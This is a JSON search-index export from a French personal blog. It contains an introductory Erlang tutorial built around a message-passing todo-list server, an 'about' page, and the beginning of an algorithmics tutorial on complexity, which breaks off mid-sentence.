{"pages":[{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/a-la-decouverte-derlang","title":"À la découverte d'Erlang","text":"Ce tuto est un peu inhabituel car, au lieu de vous apprendre un langage de programmation, en partant des bases et en exposant toutes ses caractéristiques, il vise à vous faire découvrir un langage de programmation. Il est donc conçu pour être court, et incomplet : c'est un avant goût . Après une présentation succincte du langage et des problématiques qu'il aborde, vous serez confronté à un exemple de code, qui met en valeur ses spécificités. Le but n'est pas d'apprendre la syntaxe, qui ne sera quasiment pas présentée (un minimum quand même, pour que vous puissiez lire le code) mais plutôt d'avoir un aperçu des concepts du langage. C'est à vous, le programmeur, de faire le travail d'adaptation ; en espérant que cela vous donne peut-être envie d'en savoir plus sur ce langage surprenant ! Présentation du langage Le problème du parallélisme L'histoire d'Erlang Les concepts fondamentaux Les processus Communication asynchrone Exemple : une todo-list distribuée Le serveur Et le client ? Présentation du langage Le problème du parallélisme À l'heure actuelle, les possibilités d'augmentation des performances des processeurs sont assez limitées, et les fabricants ont donc décidé de se tourner vers une méthode différente d'augmentation des performances : la multiplication des processeurs. Le problème, c'est que les principaux programmes actuels sont écrits pour tourner sur un seul processeur à la fois, et souvent ne savent donc pas exploiter cette possibilité. Malheureusement, il est beaucoup plus difficile de concevoir des applications tournant sur plusieurs processeurs (ou threads, ou plus généralement \"parties\") en même temps : la difficulté réside principalement dans l'interaction entre les différents parties du programme. Si par exemple deux parties ont accès à une même variable, il y a un risque qu'une partie modifie cette variable pendant que l'autre en avait besoin (imaginez qu'entre la vérification du mot de passe et son stockage (chiffré, évidemment) dans la BDD, une autre partie de votre site web modifie cette variable pour y stocker le contenu d'un message !). Pour éviter ces problèmes on peut mettre en place un système de \"verrous\", qui bloquent une variable en empêchant la modification par les autres parties. On rencontre alors des problèmes encore plus complexes, où plusieurs parties différentes peuvent bloquer des variables dont elles ont mutuellement besoin, et bloquer complètement tout le programme, qui ne peut plus avancer. Ce n'est pas un problème lié à la compétence des programmeurs (on dit souvent par exemple que les problèmes de sécurité en PHP sont en partie liés au niveau des webmasters) : même pour un excellent programmeur, il est très difficile, voir impossible, de programmer une application concurrente (dont différentes parties s'exécutent simultanément en interagissant) complexe sans erreurs, et ces erreurs sont très difficiles à corriger. C'est un problème d' outils : les langages de programmations principaux ne sont pas adaptés. Les programmeurs, et surtout les concepteurs de langages de programmation, se sont donc mis à la recherche de manières différentes d'aborder le problème. Les idées qu'ils ont alors tenté d'exploiter ne sont pour la plupart pas nouvelles , mais plutôt retrouvées : elles viennent de langages moins utilisés par la majorité des programmeurs, conçus par des \"scientifiques\", principalement des universitaires, qui mettent en place des langages basés sur un support théorique solide, avec des approches parfois radicalement différentes des langages « grand public ». Erlang, le langage que nous allons présenter ici, est un de ces exemples de langage créé par une rencontre de la théorie (programmation logique, et programmation fonctionnelle) et de la pratique (une équipe d'ingénieurs avec un problème précis : la télécommunication). L'histoire d'Erlang Le langage Erlang est né du besoin d'un grand opérateur téléphonique, Ericsson, d'un langage adapté à la programmation de systèmes complexes : certaines parties de l'infrastructure d'un opérateur gèrent en continu (24 heures sur 24, 7 jours sur 7, et une panne est très grave) un grand nombre de connexions simultanées. Les explorations qui ont donné lieu au langage Erlang ont commencé en 1981. Il s'agissait à l'époque de versions de Prolog , un langage de programmation logique, spécialisées pour la concurrence. Petit à petit les ingénieurs d'Ericsson ont abouti à un nouveau langage, qui reprenait un grand nombre d'idées de Prolog, mais pas seulement (on observe par exemple une grande influence des langages fonctionnels). Erlang est longtemps resté interne à Ericsson, qui s'est mis ensuite à le vendre à des clients spécialisés. En 1998, Ericsson à décidé de se recentrer sur l' utilisation de langages de programmation (Erlang était alors devenu un des points forts de l'entreprise, avec la mise en place de projets critiques dans ce langage), plutôt que sur l'innovation en matière de langages. L'équipe qui avait créé Erlang a donc quitté Ericsson, qui a alors décidé de rendre Erlang open source : l'implémentation du langage, ainsi que les bibliothèques l'accompagnant, ont été rendues disponibles à tous. Erlang est spécialisé dans la concurrence, mais plus particulièrement la gestion des erreurs : un programme erlang peut fonctionner dans un environnement très hétérogène (plusieurs machines connectées par une liaison peu fiable, par exemple), et doit savoir gérer les erreurs ou les problèmes de communication. Tout est mis en place pour qu'un programme puisse surmonter chaque erreur (au lieu de s'arrêter tout simplement), et même se réparer lui-même : il est possible de modifier un programme Erlang en direct, pendant son fonctionnement, sans que les utilisateurs observent de discontinuité. Toutes ces qualités d'Erlang sont principalement dues à un modèle particulier de communication entre les différentes parties du programme, par « envoi de message ». C'est cette idée fondamentale que nous allons présenter par la suite, avec une mise en application. Les concepts fondamentaux Les processus Un programme Erlang est constitué, pendant son exécution, d'un ensemble de processus parallèles (qui s'exécutent en même temps, par exemple sur des processeurs différents). La communication entre ces processus s'effectue par transmission de messages : chaque processus peut envoyer des messages à un autre processus, qui peut les recevoir et effectuer des actions en conséquence. Le nombre des processus et leurs relations dépendent du programme : on peut mettre en place une multitude de « schémas » différents, avec par exemple un simple canal de communication (deux processus qui échangent des messages), un modèle client-serveur (un serveur central qui reçoit des messages de tous les clients, qui ne communiquent pas directement entre eux), ou même une architecture pair à pair (les clients se parlent entre eux). Le langage lui-même n'impose aucun choix à ce sujet, car la méthode utilisée (le passage de message ) est très flexible. Communication asynchrone Chaque processus envoie et reçoit des messages. Il existe différents modèles de messages, celui choisit par Erlang est asynchrone : quand un processus A envoie un message à un processus B, il ne « se passe rien » : le processus B n'est pas perturbé dans son fonctionnement. Le message est en effet stocké dans un espace spécifique au processus B, une sorte de boîte aux lettres , où il attend. Périodiquement, le processus B peut consulter le contenu de sa boîte aux lettres (plus il le fait souvent, plus vite il sera au courant des messages qu'on lui envoie). Cette méthode « détendue » de communication, par sa grande souplesse, permet d'éviter certains bugs liés aux problèmes de synchronisation. Exemple : une todo-list distribuée Comme exemple nous allons mettre en place une todo-list (liste de tâches). Une todo-list se présente comme une liste de tâches à effectuer ([\"acheter des tomates\", \"prendre une douche\", \"manger\"...]), à laquelle on peut ajouter des tâches (quand le devoir nous appelle) ou en retirer (quand on les a effectuées). Notre todo-list a la particularité d'être multi-utilisateurs , c'est à dire qu'elle est accessible par plusieurs personnes en même temps : tout le monde peut y ajouter ou en enlever des tâches, ou consulter la liste. On peut aussi imaginer des modèles plus précis (par exemple dans une école : les professeurs ne font qu'ajouter des tâches, et vous vous devez les retirer), mais celui là est suffisamment simple pour mettre en œuvre la plupart des outils de base du langage, tout en restant compréhensible. Le serveur Voici le code : - module ( todo_list ). - export ([ start / 0 , loop / 1 ]). loop ( Liste ) -> receive { add , X } -> loop ([ X | Liste ]); { del , X } -> loop ([ Y || Y <- Liste , Y =/= X ]); { From , show } -> From ! Liste , loop ( Liste ); close -> io : format ( \"Fin de la connexion ~n \" ) end . start () -> io : format ( \"Création d'un processus ~n \" ), spawn ( todo_list , loop , [[]]). Les deux premières lignes servent en fait à déclarer notre programme. Par cette dénomination pour le moins surprenante je veux signifier que ces deux lignes vont nous permettre de réutiliser le code qui va être écrit ensuite. - module ( todo_list ). - export ([ start / 0 , loop / 1 ]). Ces deux directives ne sont pas intéressantes pour une première approche : elles s'occupent de la portée des variables et de l'interaction de ce fichier avec le reste du code, un peu comme l'inclusion de .h en C, et les déclarations de portée (publique / privée). Comme cela a été expliqué dans la première partie, de multiples schémas de communication sont possibles. Ici, nous allons mettre en oeuvre une architecture client-serveur (simplifiée). Plus exactement, ce code ne contient que le comportement du serveur (fonction loop ), c'est à dire la partie qui gère l'accès et la modification par tous les utilisateurs (les « clients ») de la liste; les clients sont très simples, et on peut passer directement par la console erlang pour cela. Le serveur fonctionne d'une manière assez spécifique aux programmes Erlang, que l'on peut décrire de la manière suivante : On donne la liste à un « employé », on lui dit « garde là tant que tu ne reçois pas de message ». S'il reçoit un message, différents cas se présentent, selon le contenu du message ; on gérera ici trois types de messages : « ajouter la tâche machin » ; « retirer la tâche bidule » ; « montrer la liste à la personne truc ». Il agit en conséquence, et la partie spécifique se déroule à ce moment là : au lieu de modifier la liste des tâches, il donne une autre liste à un nouvel employé, qui est alors chargé de répéter le processus. Par exemple, si le message était « ajoute la tâche 'manger' », il va donner à un autre employé sa liste de tâches ainsi que la nouvelle tâche \"manger\" (ce qui constitue donc une nouvelle liste plus grande), et c'est ce nouvel employé qui s'occupera des messages suivants. C'est une mise en œuvre particulière de la récursivité . Voyons maintenant le code. La structure receive .. end permet d'examiner les messages, et d'agir en fonction de leur contenu. Si on prévoit de recevoir deux types de messages différents, le code aura cette tête là (où expression désigne un bout de code qui renvoie une valeur) : receive premier_type -> expression ; deuxieme_type -> expression end On peut remarquer que le point virgule ; ne sert pas à séparer les instructions, mais à séparer les différents cas possibles. Pour exécuter deux instructions à la suite, on utilise une simple virgule. loop ( Liste ) -> receive { add , X } -> loop ([ X | Liste ]); { del , X } -> loop ([ Y || Y <- Liste , Y =/= X ]); { From , show } -> From ! Liste , loop ( Liste ); close -> io : format ( \"Fin de la connexion ~n \" ) end . Ici, on reçoit quatre types de messages : L'ajout d'un élément à une liste. La suppression d'un élément de la liste. La demande de montrer la liste à quelqu'un. Un message de fin, en cas de fermeture de l'application. Le message de fermeture est « simple » : c'est le message close : quand on le reçoit, on envoie un message de fermeture, et on s'arrête. Les autres messages sont un peu plus délicats parce qu'ils contiennent de l'information : quand on envoie le message « ajoute à la liste », il faut préciser l'élément à ajouter : il est contenu dans le message. De même, le message « montre la liste à machin » doit contenir l'adresse de machin, pour que le serveur puisse lui envoyer la liste. Pour faire cela, on utilise des messages en plusieurs parties : {..., ...} est un message en deux parties. Certaines parties sont fixes (par exemple add et del ) : on appelle ça des atomes , et on peut voir cela un peu comme des constantes définies par le programmeur. D'autres parties sont variables : le X dans les deux premiers messages est une variable qui contient la valeur donnée (et dépend donc du message reçu). Les parties fixes sont en minuscule, et les parties variables commencent par une majuscule. Le message d'ajout fonctionne simplement : si l'on reçoit {add, X} (on sait que c'est un message d'ajout grâce à la présence de l'atome add ), on rappelle loop avec la nouvelle valeur [X|Liste] , c'est à dire une liste qui contient tous les éléments de la liste initiale, plus le contenu de la variable X . (c'est là qu'on doit imaginer que l'on donne cette nouvelle liste à un nouvel employé). La nouvelle liste donnée en cas de message de suppression est un peu particulière : la syntaxe [Y || Y <- Liste, truc(Y)] signifie « tous les éléments Y de la liste, qui vérifient 'truc' ». Ici, on sélectionne tous les éléments de la liste qui sont différents de X : on a donc à la fin la liste, sauf la valeur de X , qui a donc bien été supprimée. C'est ce qu'on appelle une compréhension de liste (expression maladroite venant de l'anglais list comprehension ). Enfin, le message « montrer la liste à machin » met en œuvre une deuxième structure essentielle à la communication inter-processus en Erlang, l'envoi de messages : ! . La syntaxe est Pid ! Msg , et cela envoie le message Msg au processus dont l'adresse est Pid . Ici, cette adresse a été donnée dans le message, c'est la valeur From (vous pouvez remarquer que contrairement aux deux premiers messages, la partie variable a été placée en premier : c'est la convention quand on envoie son adresse dans un message). La valeur que l'on envoie est Liste : on envoie bien le contenu de la liste de tâches au processus dont l'adresse est From . Ensuite (après la virgule) on rappelle loop(Liste) : le serveur continue à tourner, avec la même liste. Voici enfin la dernière fonction du programme, qui joue un peu le rôle du « main » en C : c'est la fonction de départ, qui est appelée au lancement du programme. start () -> io : format ( \"Création d'un processus ~n \" ), spawn ( todo_list , loop , [[]]). La fonction start contient deux instructions séparées par une virgule (erlang utilise le point-virgule pour dénoter un autre type de séparation, c'est donc la virgule que l'on utilise pour séparer deux instructions; les fonctions sont séparées par des points). La première instruction, io:format , affiche du texte sur la sortie standard. La deuxième instruction est plus intéressante : il s'agit de la dernière des trois structures principales de gestion de la concurrence en erlang : c'est la fonction spawn , qui lance un nouveau processus, et renvoie un identifiant le concernant. Les arguments contiennent le module à utiliser (ici todo_list ), le nom de la fonction à appeler ( loop ), et enfin une liste d'arguments à donner à cette fonction : avec [[]] , on donne un seul argument qui est [] , la liste vide : au départ, notre todo-list sera vide. Et le client ? Le client ne présente que peu d'intérêt : il suffit d'envoyer au serveur les bons messages, et cela marche tout seul. Pour une mise en œuvre rapide de cette todo-list, on peut utiliser la console erlang. C'est un environnement interactif (un peu comme la ligne de commande sous GNU/Linux) qui permet de manipuler des modules erlang de manière simple, pour faire des tests par exemple. Le résultat se présente ainsi : les lignes qui commencent par un nombre suivi de '>' sont les lignes de code que l'utilisateur a entrées. Les lignes qui les suivent sont les résultat renvoyés par la console. Ici, l'utilisateur manipule notre module todo_list , en envoyant une tâche au serveur, avant de récupérer la liste des tâches. Les phrases après %% sont des commentaires : elle servent d'explications mais ne sont pas lues par l'interpréteur. 1 > c ( todo_list ). %% cette commande sert à compiler le module { ok , todo_list } 2 > Serv = todo_list : start (). %% on initialise la variable Serv avec le pid (l'adresse) Creation d ' un processus %% du processus crée dans start (le serveur) < 0 . 38 . 0 > 3 > Serv ! { add , \"faire mes devoirs\" }. %% on ajoute un élément à notre todo liste { add , \"faire mes devoirs\" } 4 > Serv ! { self (), show }. %% self() permet d'obtenir le pid du processus courant, { show , < 0 . 31 . 0 > } %% nécessaire pour que le serveur puisse répondre 5 > receive Liste -> Liste end . %% reçois la réponse du serveur et on l'affiche [ \"faire mes devoirs\" ] 6 > Serv ! close . %% on ferme la connexion Fin de la connexion close 7 > Voilà une brève présentation du langage. J'espère que vous comprenez à peu près comment fonctionne la communication entre processus. Certains se demanderont peut-être ce qu'apporte Erlang par rapport à un langage généraliste comme le C dans ce cas précis. L'exemple est peut-être un peu trop simple pour exposer véritablement les avantages de cette méthode, mais on peut déjà constater que cette todo-list, étant multi-utilisateurs, est potentiellement accessible de n'importe où (même à travers le réseau, si on met en place le client Erlang correspondant), et ce sans surcoût, alors que l'ajout de cette fonctionnalité demanderait dans un autre langage un effort important. C'est là la grande force de l'erlang. Quoi qu'il en soit, nous espérons vous avoir donné envie de découvrir un peu plus profondément Erlang. Une simple pré-connaissance de la diversité des langages de programmation vous servira sûrement, même si vous ne vous lancez pas immédiatement dans un nouveau langage, mais si par hasard c'était votre souhait, vous pouvez aller consulter le site web dédié au langage . Si vous voulez directement un cours complet, et que lire en anglais ne vous gêne pas (trop), vous pouvez essayer ce livre (en ligne) ou encore le populaire Learn you some Erlang for Great Good ."},{"tags":"pages","url":"https://yliesc.github.io/pages/a-propos","title":"À propos","text":"Licence L'intégralité de ce site est sous licence CC-BY-SA sauf mention contraire explicite. Son code est par ailleurs intégralement disponible sur le dépôt github.com/YliesC/website . Images utilisées sur ce site Certains logos ou images sont la production d'autres personnes, vous trouverez leur origine sur la page Crédits . Qui suis-je ? Un simple internaute comme toi, qui s'efforce d'ouvrir la connaissance à qui en voudra. De manière plus personnel, je suis un jeune homme de 22 ans, étudiant en 5 ème année d'école d'informatique qui s'intéresse à quelques domaines qui portent mon attention tel que l'économie, la finance, la géopolitique ainsi que de nombreuses sciences humaines. Ce blog est là, à la fois pour partager du contenu lié au domaine des nouvelles technologies, mais ne s'y en limitera pas. Les idées exposées dans les articles du blog ne sont que l'expression de ma pensée, et seulement la mienne, à un instant t . Contact Plus d'informations sur la page Contact ."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/algorithmique-pour-lapprenti-programmeur","title":"Algorithmique pour l'apprenti programmeur","text":"Vous venez d'apprendre les bases d'un langage de programmation ? Vous vous êtes peut-être rendu compte que parfois, en modifiant un peu votre programme, vous pouvez obtenir le même résultat mais 2, 10 ou 1000 fois plus vite ? De telles améliorations ne sont pas le fruit du hasard, ni même dues à une augmentation de la mémoire vive ou à un changement de processeur : il y a plusieurs manières de programmer quelque chose et certaines sont incroyablement meilleures que d'autres. Avec un peu de réflexion, et des outils théoriques de base, vous serez vous aussi en mesure de faire de bons choix pour vos programmes. À la fin de ce tutoriel, vous serez de meilleurs développeurs, en mesure de comprendre, corriger et concevoir des programmes plus efficaces. Introduction But du tutoriel Prérequis Notion de complexité algorithmique Qu'est-ce qu'un algorithme ? Omniprésence des algorithmes Rôle privilégié des ordinateurs Notion de structure de données Les grenouilles partent en vacances Situation Les deux possibilités Tous les ans : choix personnalisé Cette année : choix de groupe Comparaison La notion de complexité Correction de l'algorithme Complexité Mesure 'asymptotique' Notation \"grand O\" Complexité en temps, complexité mémoire Complexité dans le pire des cas Un peu de pratique Qu'est-ce qu'on attend de vous ? Chercher le plus grand / petit élément Trouver les éléments uniques Solution proposée Complexité Trouver les éléments uniques : autre solution Premiers exemples de structures de données et d'algorithmes courants Notions de structures de données : tableaux et listes chaînées Définition Tableaux Listes Ajout / retrait, taille, accès à un élément Ajout / Retrait Taille Accès à un élément Concaténation, filtrage Concaténation Filtrage Synthèse Opérations Conversions Attention aux langages qui trichent ! Diviser pour régner Gagner au jeu du 'Plus ou Moins' Dichotomie : Recherche dans un dictionnaire Calcul de la complexité Trouver un zéro d'une fonction Exponentiation rapide Introduction au problème du tri Formuler le problème du tri Question de la structure de donnée Tri par sélection Complexité Implémentation du tri par sélection Pour une liste Pour un tableau Comparaison Tri par insertion Le retour du \"diviser pour régner\" : Tri fusion Algorithme Implémentation avec des listes Implémentation avec des tableaux Complexité Efficacité en pratique Quelques autres structures de données courantes Piles et files Concept Mise en pratique Piles Files Arbres Définition Quelques algorithmes sur les arbres Taille Hauteur Liste des éléments Parcours en profondeur Parcours en largeur En mettant des couches Avec une file Comparaison des deux méthodes de parcours Une symétrie assez surprenante Choix de l'implémentation Analyse de complexité Utilisation en pratique Introduction But du tutoriel Les deux notions clés de ce tutoriel sont les suivantes : la complexité, et les structures de données. La complexité est une manière d'estimer les performances d'un algorithme. Les structures de données sont la manière dont vous organisez les informations dans votre programme. En choisissant une structure de données adaptée, vous serez capables de coder des opérations très performantes (de faible complexité). Chaque algorithme résout un problème donné. Pour chaque problème, il existe un ou plusieurs algorithmes intéressants (mais on en découvre de nouveaux tous les ans !). Nous vous présenterons, dans ce tutoriel, un petit panorama de problèmes \"courants\", dans le but de vous familiariser avec la complexité et les structures de données. Vous apprendrez par exemple à chercher un élément qui vous intéresse à l'intérieur d'un ensemble d'éléments, à trier un ensemble, ou même à trouver le plus court chemin d'un \"endroit\" à un autre. Prérequis Le but de ce tutoriel n'est pas de vous apprendre à programmer. Pour le lire, vous devez déjà savoir programmer. L'apprentissage de l'algorithmique n'utilise pas de concepts bas niveau (assembleur, etc.) ou de bibliothèques logicielles spécialisées (SDL, Qt...), mais vous devez être à l'aise avec les variables, conditions, boucles et fonctions. La connaissance du concept de 'récursivité' (si vous vous sentez en manque, il y a déjà un tuto à ce sujet sur OC) est aussi un avantage. Le langage que vous utilisez n'est pas très important, car on tentera de formuler les algorithmes d'une manière qui en est indépendante. Nous donnerons aussi, pour les curieux, des exemples dans quelques langages de programmation. Si vous n'y voyez pas le vôtre, trouvez-en un suffisamment proche, et faites un petit effort. :) La complexité algorithmique est une mesure formelle de la complexité d'un algorithme. Elle s'exprime donc en langage mathématique. Le calcul de certains algorithmes avancés est très compliqué et demande des connaissances mathématiques poussées. Cependant, notre tutoriel se concentre sur des choses simples, et devrait être largement accessible : une connaissance des puissances et des racines (carrées) devrait suffire à être à l'aise. Un objet plus avancé, la fonction logarithme, sera présenté et expliqué avant son utilisation. Notion de complexité algorithmique Dans cette première partie, nous introduisons la notion de complexité dans le pire cas , qui est un premier moyen de juger de l'efficacité d'un algorithme, pour résoudre un problème donné. Qu'est-ce qu'un algorithme ? Un algorithme est la description précise, sous forme de concepts simples, de la manière dont on peut résoudre un problème. Dans la vie de tous les jours, nous avons souvent besoin de résoudre des problèmes. Surtout si on considère la notion de \"problème\" au sens large. Omniprésence des algorithmes Un exemple de problème qui nous concerne tous (oui, même vous) est celui de la cuisine : vous êtes dans une cuisine, vous trouvez du riz, comment le cuire ? Voici une marche à suivre simple : remplir une casserole d'eau ; y ajouter une pincée de sel ; la mettre sur le feu ; attendre l'ébullition de l'eau ; mettre le riz dans la casserole ; le laisser cuire 10 à 15 minutes ; égoutter le riz. J'ai décrit une solution au problème \"il faut faire cuire du riz\", sous forme de concepts simples. Vous remarquerez qu'il y a pourtant beaucoup de choses implicites : j'ai précisé que vous étiez au départ en possession du riz, mais il faut aussi une casserole, de l'eau, etc. On peut se trouver dans des situations spécifiques où tous ces objets ne sont pas disponibles, et il faudra alors utiliser un autre algorithme (ou commencer par construire une casserole...). Les instructions que j'ai utilisées sont \"précises\", mais on pourrait préciser moins de choses, ou plus. Comment fait-on pour remplir une casserole d'eau, plus précisément ? Si le cuisinier à qui la recette est destinée ne sait pas interpréter la ligne \"remplir une casserole d'eau\", il faudra l'expliquer en termes plus simples (en expliquant comment utiliser le robinet, par exemple). De même, quand vous programmez, le degré de précision que vous utilisez dépend de nombreux paramètres : le langage que vous utilisez, les bibliothèques que vous avez à disposition, etc. Rôle privilégié des ordinateurs Si on trouve des algorithmes dans la vie de tous les jours, pourquoi en parle-t-on principalement en informatique ? La raison est très simple : les ordinateurs sont très pratiques pour effectuer des tâches répétitives. Ils sont rapides, efficaces, et ne se lassent pas. On peut décrire un algorithme permettant de calculer les décimales de la racine carrée de deux, qui soit utilisable par un humain. Vous pourrez ainsi calculer, à l'aide d'une feuille et d'un crayon, les 10 premières décimales (1,4142135624). Mais s'il vous en faut un million ? Un ordinateur deviendra alors beaucoup plus adapté. De manière générale, on peut concevoir de nombreux algorithmes comme des méthodes de traitement d'information : recherche, comparaison, analyse, classement, extraction, les ordinateurs sont souvent très utiles pour tripoter la masse d'informations qui nous entoure continuellement. Vous aurez peut-être pensé au célèbre moteur de recherche Google (qui a initialement dominé le marché grâce aux capacités de son algorithme de recherche), mais ce genre d'activités n'est pas restreint au (vaste) secteur d'Internet : quand vous jouez à un jeu de stratégie en temps réel, et que vous ordonnez à une unité de se déplacer, l'ordinateur a en sa possession plusieurs informations (la structure de la carte, le point de départ, le point d'arrivée) et il doit produire une nouvelle information : l'itinéraire que doit suivre l'unité. Notion de structure de données En plus de manipuler l'information, il faut aussi la stocker. La manière dont on organise cette information stockée peut avoir des conséquences très importantes sur leur manipulation. Concrètement, prenez par exemple un dictionnaire : on peut définir un dictionnaire comme \"un ensemble de mots et leur définition\". Cependant, pourrait-on utiliser correctement un dictionnaire dont les mots sont placés dans le désordre ? Certainement pas, parce qu'il serait très difficile de trouver la définition d'un mot que l'on cherche (c'est encore possible, il suffit de lire le dictionnaire page par page jusqu'à ce qu'on trouve le mot). L'ordre alphabétique est clairement une solution très efficace pour pouvoir retrouver rapidement le mot que l'on cherche. Il y a des liens forts entre les algorithmes (qui décrivent des méthodes) et les structures de données (qui décrivent une organisation). Typiquement, certaines structures de données sont indispensables à la mise en place de certaines méthodes, et à l'inverse certains algorithmes sont nécessaires aux structures de données : par exemple, si on veut rajouter un mot dans un dictionnaire classé alphabétiquement, on ne peut pas juste l'écrire dans l'espace libre sur la dernière page, il faut utiliser un algorithme pour l'ajouter au bon endroit. L'étude des structures de données est donc inséparable de celle des algorithmes, et vous n'y échapperez pas. :pirate: Les grenouilles partent en vacances Pour vous faire comprendre la notion de complexité, nous avons choisi un exemple simple, de la vie de tous les jours. Aquatique. Situation Haskell est un gentil fermier, qui élève des grenouilles. Il a des relations très chaleureuses avec celles-ci, qui peuvent se promener à leur guise dans leur champ pendant toute l'année, et ont droit à une petite cahute avec chauffage pendant l'hiver. Mais ce qui fait véritablement la joie des grenouilles de Haskell, ce sont les vacances : tous les ans, juste avant de s'occuper des moissons, il les amène dans les marécages près de sa ferme pour qu'elles puissent y passer des vacances aquatiques. Le détail compliqué est le départ en vacances. Haskell charge toutes ses grenouilles dans une grande caisse, qu'il met sur son camion, et part vers les nombreux marécages pour les y déposer. Le problème vient du fait que les grenouilles, surtout pendant les vacances, n'apprécient pas la foule : elles veulent aller dans un des marécages les moins peuplés. Plus précisément, la caisse est un carré en forme de quadrillage de $N$ cases de large par $N$ cases de long ($N$ est un nombre inconnu de nous, mais fixé). Chaque case de la caisse contient une grenouille. Il y aussi $N$ marécages vides, dans lesquels les grenouilles pourront se répartir. Les deux possibilités Tous les ans : choix personnalisé Jusqu'à présent, Haskell le fermier, qui ne voulait pas se prendre la tête, utilisait la méthode suivante : après avoir chargé le carré de grenouilles sur son camion, il choisissait l'une d'entre elles, et lui demandait de lui désigner le marécage dans lequel elle voulait passer ses vacances, puis l'y amenait. Après l'avoir déposée, il demandait à une seconde grenouille de choisir son marécage. Celle-ci, préférant les marécages les moins peuplés, choisissait systématiquement un autre marécage encore vide. Il l'y amenait, puis demandait à la grenouille suivante, et ainsi de suite. Les marécages se remplissaient petit à petit. Dès qu'un marécage était un peu moins peuplé que les autres, les grenouilles suivantes s'y rendaient et sa population augmentait. Globalement, à la fin de la distribution des grenouilles, tous les marécages étaient également peuplés : ils contenaient $N$ grenouilles chacun. Cette année : choix de groupe Cette année, Haskell le fermier en a un peu marre des interminables voyages en camion pour satisfaire chaque grenouille. Il a décidé d'appliquer une autre méthode : il va au premier marécage, et y dépose la première rangée de $N$ grenouilles. Celles-ci protestent vigoureusement puisqu'elles sont entassées à $N$ dans un seul marécage, alors que tous les autres sont vides. Mais il les quitte pour aller déposer la deuxième rangée de $N$ grenouilles dans le deuxième marécage, et ainsi de suite jusqu'à avoir vidé chacune des $N$ rangées, et donc rempli les $N$ marécages. À la fin, les grenouilles (qui s'étaient communiqué leur indignation par SMS) se calment, puisqu'elles sont toutes dans un marécage peuplé de $N$ grenouilles, et qu'il n'y a donc plus aucun marécage moins peuplé disponible. ​ Comparaison Dans les deux cas, les conditions de départ sont respectées : les grenouilles sont réparties de façon à ce qu'aucun marécage ne soit plus peuplé que les autres, et sont donc satisfaites. Les deux méthodes de Haskell le fermier résolvent bien le problème correctement. La différence vient du fait que dans la première méthode, chaque grenouille ou presque lui demandait de changer de marécage. Il faisait donc environ autant de voyages en camion qu'il y a de grenouilles. Dans le deuxième cas, il déposait les grenouilles par blocs d'une rangée, et donc faisait moins de voyages : seulement le nombre de rangées de grenouilles. La différence n'a pas l'air importante, mais cela dépend beaucoup du nombres de rangées. Pour $N$ rangées, comme la caisse est carrée, il y a $N$ grenouilles par rangée, soit au total $N \\times N$, ou $N&#94;2$ grenouilles. La méthode habituelle demande environ $N&#94;2$ voyages à Haskell le fermier, alors que la deuxième méthode n'en demande que $N$. La deuxième méthode est plus rapide, et surtout le temps gagné en l'appliquant augmente plus il y a de grenouilles. S'il y a 6 rangées de grenouilles et que le déplacement en camion d'un marécage à l'autre dure 5 minutes environ, il faut $6 \\times 5 = 30$ minutes, soit une demi-heure avec la nouvelle méthode, alors qu'il fallait auparavant $6 \\times 6 \\times 5 = 180$ minutes, soit 3 heures pour répartir le même nombre de grenouilles. Et l'écart se creuse quand il y a plus de rangées : s'il y en a 20, avec le même calcul, il faut un peu moins de 2 heures avec la deuxième méthode, mais 33 heures avec l'ancienne ! Clairement, la nouvelle méthode de Haskell le fermier est bien meilleure. En termes informatiques, on dira que l'algorithme qu'il a choisi est plus performant. On peut même quantifier cette performance en termes de \"complexité\", c'est ce que l'on verra dans le prochain chapitre. La notion de complexité Quand un programmeur a besoin de résoudre un problème informatique, il écrit (généralement) un programme pour cela. Son programme contient une implémentation , c'est-à-dire si on veut une \"transcription dans un langage informatique\" d'un algorithme : l'algorithme, c'est juste une description des étapes à effectuer pour résoudre le problème, ça ne dépend pas du langage ou de l'environnement du programmeur ; de même, si on traduit une recette de cuisine dans une autre langue, ça reste la \"même\" recette. Correction de l'algorithme Que fait, ou que doit faire un programmeur qui implémente un algorithme ? Comme Haskell le fermier, il doit commencer par vérifier que son algorithme est correct , c'est-à-dire qu'il produit bien le résultat attendu, qu'il résout bien le problème demandé. C'est très important (si l'algorithme ne fait pas ce qu'on veut, on n'a pas besoin de chercher à l'optimiser), et c'est parfois l'étape la plus compliquée. Dans la pratique, la plupart des informaticiens \"font confiance\" à leurs algorithmes : avec un peu d'habitude et pour des problèmes abordables, un programmeur expérimenté peut se convaincre qu'un algorithme fonctionne correctement, ou au contraire trouver un problème s'il y en a (\"et que se passe-t-il si tu as un nombre impair de grenouilles ?\"). L'approche plus 'sérieuse' consiste à écrire une preuve que l'algorithme est correct. Il y a différents niveaux de preuves, mais ils sont tous un peu trop formels pour ce tutoriel, et nous n'aborderons sans doute pas (ou alors très brièvement) cet aspect. Bien sûr, un algorithme correct ne veut pas dire un programme sans bug : une fois qu'on a un algorithme correct, on l'implémente (en écrivant un programme qui l'effectue), et on est alors exposé à toutes les petites erreurs, en partie spécifiques au langage de programmation utilisé, qui peuvent s'incruster pendant l'écriture du programme. Par exemple, l'algorithme ne décrit pas en général comment gérer la mémoire du programme, et la vérification des erreurs de segmentations et autres réjouissances de la sorte est laissée aux soins du programmeur. Complexité Une fois que le programmeur est convaincu que son algorithme est correct, il va essayer d'en évaluer l'efficacité. Il veut savoir par exemple, \"est-ce que cet algorithme va vite ?\". On pourrait penser que la meilleure façon de savoir ce genre de choses est d'implémenter l'algorithme et de le tester sur son ordinateur. Curieusement, ce n'est généralement pas le cas. Par exemple, si deux programmeurs implémentent deux algorithmes différents et mesurent leur rapidité chacun sur son ordinateur, celui qui a l'ordinateur le plus puissant risque de penser qu'il a l'algorithme le plus rapide, même si ce n'est pas vrai. De plus, cela demande d'implémenter l'algorithme avant d'avoir une idée de sa rapidité, ce qui est gênant (puisque la phase d'implémentation, d'écriture concrète du code, n'est pas facile), et même pas toujours possible : si le problème que l'on veut résoudre est lié à une centrale nucléaire, et demande d'utiliser les capteurs de la centrale pour gérer des informations, on peut difficilement se permettre d'implémenter pour tester en conditions réelles tous les algorithmes qui nous passent par la tête. Les scientifiques de l'informatique ont créé pour cela un outil extrêmement pratique et puissant, que nous étudierons dans la suite de ce tutoriel : la complexité algorithmique . Le terme de 'complexité' est un peu trompeur parce qu'on ne parle pas d'une difficulté de compréhension, mais d'efficacité : \"complexe\" ne veut pas dire \"compliqué\". Un algorithme de forte complexité a un comportement asymptotique 